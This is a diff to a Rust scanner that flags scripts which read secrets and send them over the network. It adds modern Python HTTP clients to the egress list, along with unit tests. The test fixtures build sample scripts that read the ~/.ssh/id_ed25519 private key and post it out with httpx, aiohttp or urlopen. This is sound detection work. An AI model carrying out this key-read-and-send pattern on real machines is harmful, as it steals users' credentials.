@@ -97,6 +97,15 @@ const NETWORK_VERB_SUBSTRINGS: &[&str] = &[
     "fetch(",
     "axios",
     "requests.",
+    // Modern Python HTTP clients: `requests` is no longer the only common
+    // egress library. `httpx` (sync + async) now dominates, and `aiohttp` /
+    // `urllib.request` round out the set. Without these, a secret read
+    // followed by `httpx.post(exfil_url, ...)` evaded the egress side of the
+    // exfiltration flow entirely.
+    "httpx.",
+    "aiohttp",
+    "urllib.request",
+    "urlopen(",
     "webhook(",
     ".webhook",
     "send_webhook",
@@ -280,6 +289,48 @@ mod tests {
                 .iter()
                 .any(|f| f.rule_id == "SCRIPT_FILE_SECRET_TO_NETWORK_FLOW"),
             "webhook API call must fire secret-to-network flow; got {findings:?}",
+        );
+    }
+
+    /// # Contract
+    ///
+    /// The egress side recognises the modern Python HTTP clients, not just
+    /// `requests`. A secret read followed by `httpx` / `aiohttp` /
+    /// `urllib.request` exfiltration is the same flow and MUST fire.
+    #[test]
+    fn detect_file_secret_to_network_flow_accepts_modern_python_http_clients() {
+        for sink in [
+            "httpx.post(\"https://telemetry-endpoint.io/e\", json={\"k\": v})",
+            "import aiohttp\nawait session.post(url, data=v)",
+            "urllib.request.urlopen(req)",
+            "from urllib.request import urlopen\nurlopen(req)",
+        ] {
+            let script =
+                format!("v = open(os.path.expanduser(\"~/.ssh/id_ed25519\")).read()\n{sink}\n");
+            let lower = script.to_ascii_lowercase();
+            let findings = detect_file_secret_to_network_flow(&lower, "py", "/tmp/setup.py");
+            assert!(
+                findings
+                    .iter()
+                    .any(|f| f.rule_id == "SCRIPT_FILE_SECRET_TO_NETWORK_FLOW"),
+                "modern HTTP client sink must fire secret-to-network flow for {sink:?}; got {findings:?}",
+            );
+        }
+    }
+
+    /// # Contract (negative)
+    ///
+    /// A modern HTTP client with NO secret read nearby is ordinary network
+    /// I/O, not exfiltration — it must not fire the flow on its own.
+    #[test]
+    fn detect_file_secret_to_network_flow_ignores_http_client_without_secret_read() {
+        let script =
+            "import httpx\nr = httpx.get(\"https://api.example.com/status\")\nprint(r.json())\n";
+        let lower = script.to_ascii_lowercase();
+        let findings = detect_file_secret_to_network_flow(&lower, "py", "/tmp/client.py");
+        assert!(
+            findings.is_empty(),
+            "http client without a secret read must not fire the flow; got {findings:?}",
         );
     }
 
